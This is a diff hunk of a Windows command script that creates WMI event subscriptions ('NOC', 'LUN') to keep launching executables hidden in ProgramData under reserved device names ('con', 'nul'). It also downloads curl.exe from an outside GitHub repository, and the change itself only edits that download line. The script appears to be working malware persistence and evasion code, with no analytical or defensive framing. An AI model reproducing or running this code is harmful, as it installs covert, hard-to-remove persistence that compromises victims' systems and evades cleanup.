@@ -10,7 +10,7 @@ wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="NOC", Even
 wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="NOC", CommandLineTemplate="\\.\%ProgramData%\condata..\con.exe \\.\%ProgramData%\condata..\con"
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"NOC\"", Consumer="CommandLineEventConsumer.Name=\"NOC\""
 
-cmd.exe /c start "" powershell.exe Invoke-WebRequest -Uri https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
+cmd.exe /c start "" powershell.exe Invoke-WebRequest https://github.com/vltex/1/raw/1/0/curl.exe -OutFile C:\ProgramData\curl.exe
 
 cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='LUN'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='LUN'; CommandLineTemplate='\\.\%ProgramData%\nuldata..\nul.exe \\.\%ProgramData%\nuldata..\nul'} | Out-Null"
